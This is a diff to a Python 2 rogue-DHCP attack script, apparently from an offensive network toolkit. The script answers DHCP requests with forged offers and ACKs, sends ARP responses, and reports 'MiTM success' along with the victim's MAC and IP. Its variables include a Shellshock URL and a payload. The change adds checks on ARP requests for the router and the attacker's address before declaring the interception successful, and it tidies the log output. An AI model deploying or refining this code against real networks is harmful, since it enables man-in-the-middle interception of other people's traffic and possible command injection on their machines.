@@ -73,6 +73,9 @@ shellshock_url = None
 proxy = None
 domain = None
 payload = None
+arp_req_router = False
+arp_req_your_ip = False
+possible_output = False
 
 if args.interface is None:
     current_network_interface = Base.netiface_selection()
@@ -210,6 +213,10 @@ def dhcp_reply(request):
     global domain
     global your_mac_address
     global current_network_interface
+    global arp_req_router
+    global arp_req_your_ip
+    global possible_output
+    global router_ip_address
 
     SOCK = socket(AF_PACKET, SOCK_RAW)
     SOCK.bind((current_network_interface, 0))
@@ -234,8 +241,8 @@ def dhcp_reply(request):
                     number_of_dhcp_request = 0
                     offer_ip_address = args.first_offer_ip
 
-            print Base.c_info + "DHCP DISCOVER from: " + target_mac_address + " || transaction id: " + \
-                hex(transaction_id) + " || offer ip: " + offer_ip_address
+            print Base.c_info + "DHCP DISCOVER from: " + target_mac_address + " transaction id: " + \
+                hex(transaction_id) + " offer ip: " + offer_ip_address
 
             offer_packet = make_dhcp_offer_packet(transaction_id)
             SOCK.send(offer_packet)
@@ -247,8 +254,8 @@ def dhcp_reply(request):
             chaddr = request[BOOTP].chaddr
             flags = request[BOOTP].flags
 
-            print Base.c_info + "DHCP INFORM from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
-                " || client ip: " + ciaddr
+            print Base.c_info + "DHCP INFORM from: " + target_mac_address + " transaction id: " + hex(transaction_id) + \
+                " client ip: " + ciaddr
 
             option_operation = pack("!3B", 53, 1, 5)  # DHCPACK operation
             option_netmask = pack("!" "2B" "4s", 1, 4, inet_aton(network_mask))
@@ -292,8 +299,8 @@ def dhcp_reply(request):
                 if option[0] == "requested_addr":
                     requested_ip = str(option[1])
 
-            print Base.c_info + "DHCP REQUEST from: " + target_mac_address + " || transaction id: " + \
-                hex(transaction_id) + " || requested ip: " + requested_ip
+            print Base.c_info + "DHCP REQUEST from: " + target_mac_address + " transaction id: " + \
+                hex(transaction_id) + " requested ip: " + requested_ip
 
             if target_ip_address is not None:
                 if requested_ip != target_ip_address:
@@ -373,11 +380,22 @@ def dhcp_reply(request):
                               iface=current_network_interface, verbose=False)
                         print Base.c_info + "Send ARP response!"
                     else:
-                        print Base.c_success + "MiTM success!"
-                        print Base.c_success + "Target MAC: " + Base.cSUCCESS + target_mac_address + Base.cEND
-                        print Base.c_success + "Target IP: " + Base.cSUCCESS + target_ip_address + Base.cEND
-                        SOCK.close()
-                        exit(0)
+                        arp_req_your_ip = True
+                if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].pdst == router_ip_address:
+                    arp_req_router = True
+
+                if arp_req_router or arp_req_your_ip:
+                    if not possible_output:
+                        print Base.c_warning + "Possible MiTM success!"
+                        print Base.c_warning + "Target MAC: " + Base.cWARNING + target_mac_address + Base.cEND
+                        print Base.c_warning + "Target IP: " + Base.cWARNING + target_ip_address + Base.cEND
+                        possible_output = True
+                if arp_req_router and arp_req_your_ip:
+                    print Base.c_success + "MiTM success!"
+                    print Base.c_success + "Target MAC: " + Base.cSUCCESS + target_mac_address + Base.cEND
+                    print Base.c_success + "Target IP: " + Base.cSUCCESS + target_ip_address + Base.cEND
+                    SOCK.close()
+                    exit(0)
     SOCK.close()
 
 
